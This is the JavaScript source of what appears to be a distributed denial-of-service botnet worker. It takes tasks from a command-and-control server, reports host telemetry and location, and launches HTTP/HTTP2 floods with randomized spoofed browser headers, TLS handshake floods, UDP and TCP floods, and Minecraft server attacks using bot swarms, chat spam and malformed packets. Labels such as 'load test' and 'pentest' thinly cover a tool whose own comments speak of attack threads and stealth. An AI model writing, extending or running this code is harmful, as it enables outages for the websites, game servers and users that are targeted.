/**
 * Spark Distributed Worker v6.0 - 2026 ELITE EDITION
 * 
 * Multi-threaded, HTTP/2 Enabled, Adaptive Stealth Engine
 */

const os = require('os');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const crypto = require('crypto');
const http2 = require('http2');
const http = require('http');
const https = require('https');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

let mineflayer;
try {
  mineflayer = require('mineflayer');
} catch (e) {}

if (isMainThread) {
  // ==========================================
  // MASTER THREAD: ORCHESTRATION
  // ==========================================
  const MASTER_URL = (process.env.MASTER_URL || '').trim().replace(/["']/g, '').replace(/\/$/, '');
  const WORKER_ID = (process.env.WORKER_ID || os.hostname()).trim().replace(/["']/g, '');
  const SECRET_KEY = (process.env.SECRET_KEY || '').trim().replace(/["']/g, '');

  if (!MASTER_URL || !SECRET_KEY) {
    console.error('[Master] CRITICAL ERROR: MASTER_URL and SECRET_KEY must be provided!');
    process.exit(1);
  }

  let cachedLocation = 'Unknown';
  let stats = { totalSent: 0, errors: 0, pps: 0, lastSent: 0 };
  let currentTask = null;
  let workers = [];

  const spawnWorkers = () => {
    // OOM Protection: Containers often report host CPUs (e.g. 48) but only give 1 core / 2GB RAM.
    // We strictly limit threads to WORKER_THREADS env or 1 to prevent immediate memory exhaustion.
    const threadCount = parseInt(process.env.WORKER_THREADS) || 1;
    console.log(`[Master] Initializing ${threadCount} optimized attack thread(s) for 1C/2GB limits...`);
    for (let i = 0; i < threadCount; i++) {
      const worker = new Worker(__filename, { workerData: { threadId: i } });
      worker.on('message', (msg) => {
        if (msg.type === 'stats') {
          stats.totalSent += msg.sent;
          stats.errors += msg.errors;
        }
      });
      workers.push(worker);
    }
  };

  async function fetchLocation() {
    try {
      const res = await fetch('http://ip-api.com/json/');
      const data = await res.json();
      if (data?.status === 'success') cachedLocation = `${data.countryCode}|${data.country}`;
    } catch (e) {}
  }

  let failedHeartbeats = 0;

  function reportStatus() {
    const delta = stats.totalSent - stats.lastSent;
    stats.lastSent = stats.totalSent;
    stats.pps = Math.round(delta / 5);

    const telemetry = {
      workerId: WORKER_ID,
      hostname: os.hostname(),
      os: `${os.type()} ${os.release()}`,
      cpuCores: parseInt(process.env.WORKER_THREADS) || 1, // Report actual container threads, not host CPUs
      totalRam: 2, // Hardcode to 2GB to reflect actual container limits
      freeRam: Math.round(os.freemem() / (1024 ** 3)),
      uptime: os.uptime(),
      loadAvg: os.loadavg(),
      powerScore: ((parseInt(process.env.WORKER_THREADS) || 1) * 500) + 200, // Adjusted score
      location: cachedLocation,
      requestsSent: stats.totalSent,
      currentSpeed: stats.pps,
      errors: stats.errors,
      status: currentTask ? 'RUNNING' : 'IDLE'
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 8000);

    fetch(`${MASTER_URL}/api/worker/heartbeat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${SECRET_KEY}` },
      body: JSON.stringify(telemetry),
      signal: controller.signal
    }).then(async r => {
      clearTimeout(timeoutId);
      failedHeartbeats = 0; // Reset counter on success
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      const tasks = await r.json();
      if (tasks && tasks.length > 0) {
        const newTask = JSON.stringify(tasks[0]);
        if (newTask !== currentTask) {
          currentTask = newTask;
          workers.forEach(w => w.postMessage({ type: 'task', task: tasks[0] }));
        }
      } else if (currentTask) {
        currentTask = null;
        workers.forEach(w => w.postMessage({ type: 'stop' }));
      }
    }).catch((err) => {
      clearTimeout(timeoutId);
      failedHeartbeats++;
      console.warn(`[Master] Connection lost to C2 (${err.message}). Failed heartbeats: ${failedHeartbeats}`);
      // If critical connection lost, stop all workers to avoid "ghost" attacks
      // BUT tolerate temporary network saturation during heavy attacks (wait for ~12 missed heartbeats = 1 minute)
      if (currentTask && failedHeartbeats > 12) {
        currentTask = null;
        workers.forEach(w => w.postMessage({ type: 'stop' }));
      }
    });
  }

  fetchLocation().then(() => {
    spawnWorkers();
    setInterval(reportStatus, 5000);
    console.log(`[Master] ELITE Worker ${WORKER_ID} is active.`);
  });

} else {
  // ==========================================
  // ATTACK THREAD: PERFORMANCE CORE
  // ==========================================
  const { threadId } = workerData;

  process.on('uncaughtException', (err) => {
    // Игнорируем сетевые ошибки, которые пробиваются мимо обработчиков сокетов
    if (['ECONNRESET', 'EPIPE', 'ETIMEDOUT', 'ENOTFOUND', 'EHOSTUNREACH', 'EADDRNOTAVAIL', 'EMFILE', 'ERR_HTTP2_INVALID_SESSION'].includes(err.code)) {
      if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
        ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.5));
        ctx.penalty = 5; // Удерживаем сниженную интенсивность на 5 секунд
      }
      return;
    }
  });

  const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.51'
  ];

  const RANDOM_HEADERS = () => {
    const isChrome = Math.random() > 0.3;
    const version = Math.floor(Math.random() * 5) + 120;
    const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    
    const headers = {
      'user-agent': ua,
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'accept-language': Math.random() > 0.5 ? 'en-US,en;q=0.9' : 'ru-RU,ru;q=0.8,en-US;q=0.5',
      'accept-encoding': 'gzip, deflate, br',
      'sec-ch-ua': isChrome ? `"Chromium";v="${version}", "Google Chrome";v="${version}"` : '"Not A(Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'none',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1'
    };

    // Add random referer to bypass some hotlink protections
    if (Math.random() > 0.7) {
      const referers = ['https://www.google.com/', 'https://yandex.ru/', 'https://duckduckgo.com/', 'https://t.co/'];
      headers['referer'] = referers[Math.floor(Math.random() * referers.length)];
    }

    return Object.fromEntries(Object.entries(headers).sort(() => Math.random() - 0.5));
  };

  const httpAgent = new http.Agent({ keepAlive: true, keepAliveMsecs: 10000, maxSockets: 500, scheduling: 'fifo', timeout: 5000 });
  const httpsAgent = new https.Agent({ keepAlive: true, keepAliveMsecs: 10000, maxSockets: 500, scheduling: 'fifo', timeout: 5000, rejectUnauthorized: false });

  let ctx = { active: false, intensity: 50, adaptiveIntensity: 50, activeRequests: 0, penalty: 0 };
  let localStats = { sent: 0, errors: 0 };
  let sockets = new Set();
  let timer = null;

  setInterval(() => {
    if (localStats.sent > 0 || localStats.errors > 0) {
      parentPort.postMessage({ type: 'stats', sent: localStats.sent, errors: localStats.errors });
      localStats.sent = 0; localStats.errors = 0;
    }
    
    // Clear dead sockets that are stuck in sets
    let now = Date.now();
    sockets.forEach(s => {
      if (s.destroyed || s.closed) {
        sockets.delete(s);
      } else if (s._createdAt && now - s._createdAt > 15000) {
        try { if (s.destroy) s.destroy(); } catch(e){}
        sockets.delete(s);
      }
    });
  }, 1000);

  parentPort.on('message', (msg) => {
    if (msg.type === 'task') {
      stopCurrentTask(); // Ensure old task is fully cleaned up before starting new one
      ctx.active = true;
      ctx.intensity = msg.task.payload.intensity || 50;
      ctx.adaptiveIntensity = ctx.intensity;
      ctx.penalty = 0;
      runTask(msg.task);
    }
    if (msg.type === 'stop') {
      stopCurrentTask();
    }
  });

  const stopCurrentTask = () => {
    ctx.active = false;
    ctx.activeRequests = 0;
    if (timer) {
      clearTimeout(timer);
      timer = null;
    }
    sockets.forEach(s => { 
      try { 
        if (s.destroy) s.destroy();
        else if (s.close) s.close();
        else if (s.end) s.end();
      } catch(e){} 
    });
    sockets.clear();
  };

  // Adaptive Throttling Engine (Aggressive OOM Protection)
  const monitor = () => {
    if (!ctx.active) return;
    const mem = process.memoryUsage().rss / (1024 * 1024);
    
    // Strict memory caps for 2GB containers
    if (mem > 400) {
      ctx.adaptiveIntensity = 1; // Emergency brake
    } else if (mem > 250) {
      ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.5)); // Cut by 50%
    } else if (mem < 150) {
      if (ctx.penalty > 0) {
        ctx.penalty--;
      } else {
        ctx.adaptiveIntensity = Math.min(ctx.intensity, ctx.adaptiveIntensity + 1);
      }
    }
    
    setTimeout(monitor, 1000); // Fast 1s polling
  };

  const runTask = (task) => {
    monitor();
    const payload = task.payload;
    const endTime = Date.now() + (payload.duration || 3600000);

    if (task.type === 'LOAD_TEST') {
      let url;
      try {
        url = new URL(payload.targetUrl);
      } catch(e) {
        return;
      }
      const isH2 = payload.mode === 'H2' && url.protocol === 'https:';
      const connectHost = payload.targetIp || url.hostname;
      
      const fire = () => {
        try {
          if (!ctx.active || Date.now() > endTime) return;
          
          // Adaptive throttling to avoid total drop to 0
          const targetConcurrent = Math.max(2, ctx.adaptiveIntensity * 10);
          
          if (payload.mode === 'TLS' && url.protocol === 'https:') {
            while (sockets.size < targetConcurrent && ctx.active) {
              try {
                const opts = { 
                  rejectUnauthorized: false, 
                  servername: url.hostname,
                  ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5'
                };
                const s = tls.connect(url.port || 443, connectHost, opts);
                s._createdAt = Date.now();
                sockets.add(s);
                s.on('secureConnect', () => {
                  localStats.sent++;
                  setTimeout(() => { if (!s.destroyed) s.destroy(); }, 5000); // 5s max life
                });
                s.on('data', () => {}); // Consume
                s.on('error', (err) => { 
                  if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                    ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                    ctx.penalty = 2;
                  }
                  localStats.errors++; 
                });
                s.on('close', () => { sockets.delete(s); });
              } catch(e) { localStats.errors++; break; }
            }
          } else if (isH2) {
            const maxH2Clients = Math.max(1, Math.floor(targetConcurrent / 20));
            while (sockets.size < maxH2Clients && ctx.active) {
              try {
                const client = http2.connect(`https://${connectHost}:${url.port || 443}`, { 
                  rejectUnauthorized: false,
                  servername: url.hostname,
                  settings: { enablePush: false } 
                });
                client._createdAt = Date.now();
                sockets.add(client);
                
                let spam;
                client.on('connect', () => {
                  spam = setInterval(() => {
                    if (!ctx.active || client.destroyed) { clearInterval(spam); return; }
                    const h = RANDOM_HEADERS();
                    h[':authority'] = url.hostname;
                    for(let j=0; j<20; j++) {
                      try {
                        const reqPath = url.pathname + url.search + (url.search ? '&' : '?') + 'v=' + crypto.randomBytes(4).toString('hex');
                        const req = client.request({ 
                          ':method': 'GET',
                          ':path': reqPath,
                          ...h
                        });
                        req.setTimeout(5000, () => { req.destroy(); }); // 5s timeout per h2 stream
                        req.on('response', () => { localStats.sent++; });
                        req.on('data', () => {}); // Consume
                        req.on('end', () => { req.close(); });
                        req.on('error', (err) => { 
                        if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                          ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                          ctx.penalty = 2;
                        }
                        localStats.errors++; 
                      });
                      } catch(e) { localStats.errors++; }
                    }
                  }, 200);
                });
                client.on('error', (err) => { 
                  if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                    ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                    ctx.penalty = 2;
                  }
                  localStats.errors++; 
                });
                client.on('close', () => { sockets.delete(client); if(spam) clearInterval(spam); });
                // Force close H2 clients after 15 seconds to free resources
                setTimeout(() => { if (!client.destroyed) client.destroy(); }, 15000);
              } catch(e) { localStats.errors++; break; }
            }
          } else {
            const isHttps = url.protocol === 'https:';
            const reqOpts = {
              hostname: connectHost,
              port: url.port || (isHttps ? 443 : 80),
              method: 'GET',
              servername: url.hostname,
              rejectUnauthorized: false,
              agent: isHttps ? httpsAgent : httpAgent,
              timeout: 5000 // Добавлен таймаут на уровне опций
            };
            
            const requestConcurrent = Math.max(5, ctx.adaptiveIntensity * 50);
            
            while (ctx.activeRequests < requestConcurrent && ctx.active) {
              try {
                ctx.activeRequests++;
                const h = RANDOM_HEADERS();
                h['Host'] = url.hostname;
                const reqPath = url.pathname + url.search + (url.search ? '&' : '?') + 'v=' + crypto.randomBytes(4).toString('hex');
                
                const req = (isHttps ? https : http).request({ ...reqOpts, path: reqPath, headers: h }, (res) => {
                  res.on('data', () => {}); 
                  res.on('end', () => { 
                    localStats.sent++; 
                    if (!req.isDone) { req.isDone = true; ctx.activeRequests--; }
                  });
                  res.on('error', (err) => {
                    if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                      ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                      ctx.penalty = 2;
                    }
                    localStats.errors++;
                    if (!req.isDone) { req.isDone = true; ctx.activeRequests--; }
                  });
                });
                
                req.on('error', (err) => { 
                  if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                    ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                    ctx.penalty = 2;
                  }
                  localStats.errors++; 
                  if (!req.isDone) { req.isDone = true; ctx.activeRequests--; }
                });
                req.on('close', () => {
                  if (!req.isDone) { req.isDone = true; ctx.activeRequests--; }
                });
                // Ensure request cannot hang forever
                req.setTimeout(5000, () => { 
                  if (!req.isDone) { req.isDone = true; ctx.activeRequests--; }
                  req.destroy(); 
                });
                req.end();
              } catch(e) { 
                localStats.errors++; 
                ctx.activeRequests--; 
                break; 
              }
            }
          }
        } catch (err) {
          localStats.errors++;
        }
        timer = setTimeout(fire, 50); // Увеличил делей с 20 до 50мс чтобы не душить event loop
      };
      fire();
    }

    if (task.type === 'MC_STRESS') {
      const fire = () => {
        try {
          if (!ctx.active || Date.now() > endTime) return;
          
          const isMineflayer = payload.mode === 'mineflayer';
          const targetConcurrent = isMineflayer ? Math.min(Math.max(1, ctx.adaptiveIntensity), 10) : Math.max(5, ctx.adaptiveIntensity * 10);
          
          while (sockets.size < targetConcurrent && ctx.active) {
            if (isMineflayer && mineflayer) {
              try {
                const bot = mineflayer.createBot({ 
                  host: payload.targetHost, 
                  port: payload.targetPort, 
                  username: `Spark_${crypto.randomBytes(3).toString('hex')}`, 
                  hideErrors: true,
                  connectTimeout: 5000 
                });
                bot._createdAt = Date.now();
                sockets.add(bot);
                
                let botTimer = null;
                const clean = () => { 
                  if (botTimer) clearInterval(botTimer);
                  try { bot.end(); } catch(e){} 
                  sockets.delete(bot); 
                };

                bot.on('spawn', () => { 
                  localStats.sent++; 
                  botTimer = setInterval(() => { 
                    if (ctx.active && bot.entity) {
                      try { 
                        if (payload.behavior === 'spin') {
                          bot.look(bot.entity.yaw + 1, bot.entity.pitch);
                          bot.swingArm();
                        } else if (payload.behavior === 'chat_spam') {
                          bot.chat('Testing pentest ' + crypto.randomBytes(4).toString('hex'));
                        } else if (payload.behavior === 'train' || payload.behavior === 'creep') {
                            const targetName = payload.targetPlayer;
                            const otherPlayers = Object.values(bot.players).filter(p => p.username !== bot.username && p.entity);
                            const target = targetName && bot.players[targetName] ? bot.players[targetName].entity : (otherPlayers.length > 0 ? otherPlayers[0].entity : null);
                            if (target) {
                              bot.lookAt(target.position.offset(0, 1.6, 0));
                             bot.setControlState('forward', true);
                             if (payload.behavior === 'train') bot.setControlState('sneak', Math.random() > 0.5);
                           }
                        } else {
                          bot.setControlState('jump', true); setTimeout(() => bot.setControlState('jump', false), 100); 
                        }
                      } catch(e){}
                    } else {
                      clearInterval(botTimer);
                    }
                  }, payload.behavior === 'chat_spam' ? 2000 : 500);
                });

                bot.on('error', () => { localStats.errors++; clean(); });
                bot.on('kicked', clean);
                bot.on('end', clean);
                setTimeout(clean, 30000);
              } catch(e) {
                localStats.errors++; break;
              }
            } else {
              try {
                const s = net.connect(payload.targetPort, payload.targetHost, () => {
                  let data;
                  if (payload.mode === 'legacy') {
                    data = Buffer.from([0xFE, 0x01]);
                  } else if (payload.mode === 'garbage') {
                    data = crypto.randomBytes(1024);
                  } else if (payload.mode === 'bigpacket') {
                    const payloadBuf = Buffer.alloc(10240, 0x01);
                    data = Buffer.concat([Buffer.from([0xFF, 0xFF]), payloadBuf]);
                  } else if (payload.mode === 'handshake') {
                    data = Buffer.concat([Buffer.from([0x00]), Buffer.from([0xFF, 0x05]), Buffer.from([payload.targetHost.length]), Buffer.from(payload.targetHost), Buffer.alloc(2)]);
                  } else if (payload.mode === 'bot') {
                    const name = "Bot" + crypto.randomBytes(3).toString('hex');
                    const handshake = Buffer.concat([
                      Buffer.from([0x00]), 
                      Buffer.from([0xFA, 0x05]), 
                      Buffer.from([payload.targetHost.length]), Buffer.from(payload.targetHost), 
                      Buffer.from([(payload.targetPort >> 8) & 0xFF, payload.targetPort & 0xFF]), 
                      Buffer.from([0x02]) 
                    ]);
                    const hsLen = Buffer.from([handshake.length]);
                    
                    const loginStart = Buffer.concat([
                      Buffer.from([0x00]), 
                      Buffer.from([name.length]), Buffer.from(name), 
                      Buffer.from([0x00]) 
                    ]);
                    const lsLen = Buffer.from([loginStart.length]);
                    
                    data = Buffer.concat([hsLen, handshake, lsLen, loginStart]);
                  } else {
                    data = Buffer.concat([Buffer.from([0x0F, 0x00, 0x2F, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x63, 0xDD, 0x01, 0x01, 0x00])]);
                  }
                  s.write(data); 
                  localStats.sent++;
                  if (payload.mode === 'nullping') {
                     setTimeout(() => { if (!s.destroyed) s.destroy(); }, 5000); 
                  } else {
                     setTimeout(() => { if (!s.destroyed) s.destroy(); }, 500);
                  }
                });
                s._createdAt = Date.now();
                sockets.add(s);
                s.on('data', () => {}); // Consume
                s.on('error', (err) => { 
                  if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                    ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                    ctx.penalty = 2;
                  }
                  localStats.errors++; 
                });
                s.on('close', () => { sockets.delete(s); });
                s.setTimeout(5000, () => s.destroy());
              } catch(e) {
                localStats.errors++; break;
              }
            }
          }
        } catch (err) {
          localStats.errors++;
        }
        timer = setTimeout(fire, 200);
      };
      fire();
    }

    if (task.type === 'L4_FLOOD') {
      const fire = () => {
        try {
          if (!ctx.active || Date.now() > endTime) return;
          const targetConcurrent = Math.max(5, ctx.adaptiveIntensity * 20);
          if (payload.mode === 'UDP') {
            const udp = dgram.createSocket('udp4');
            udp.on('error', () => { localStats.errors++; udp.close(); });
            let sentInBatch = 0;
            for(let i=0; i<ctx.adaptiveIntensity * 5; i++) {
              try {
                udp.send(crypto.randomBytes(512), payload.targetPort, payload.targetIp, (err) => {
                  if (err) localStats.errors++;
                  else localStats.sent++;
                  
                  sentInBatch++;
                  if (sentInBatch >= ctx.adaptiveIntensity * 5) {
                    udp.close();
                  }
                });
              } catch(e) {
                localStats.errors++;
                sentInBatch++;
                if (sentInBatch >= ctx.adaptiveIntensity * 5) udp.close();
              }
            }
          } else {
            while (sockets.size < targetConcurrent && ctx.active) {
              try {
                const s = net.connect(payload.targetPort, payload.targetIp, () => { 
                  localStats.sent++; 
                  s.write(crypto.randomBytes(64)); 
                  setTimeout(() => { if (!s.destroyed) s.destroy(); }, 500); 
                });
                s._createdAt = Date.now();
                sockets.add(s);
                s.on('data', () => {}); // Consume
                s.on('error', (err) => { 
                   if (err.code === 'EADDRNOTAVAIL' || err.code === 'EMFILE') {
                     ctx.adaptiveIntensity = Math.max(1, Math.floor(ctx.adaptiveIntensity * 0.8));
                     ctx.penalty = 2;
                   }
                   localStats.errors++; 
                 });
                s.on('close', () => { sockets.delete(s); });
                s.setTimeout(2000, () => s.destroy()); 
              } catch(e) {
                localStats.errors++; break;
              }
            }
          }
        } catch (err) {
          localStats.errors++;
        }
        timer = setTimeout(fire, payload.mode === 'UDP' ? 20 : 100);
      };
      fire();
    }
  };
}
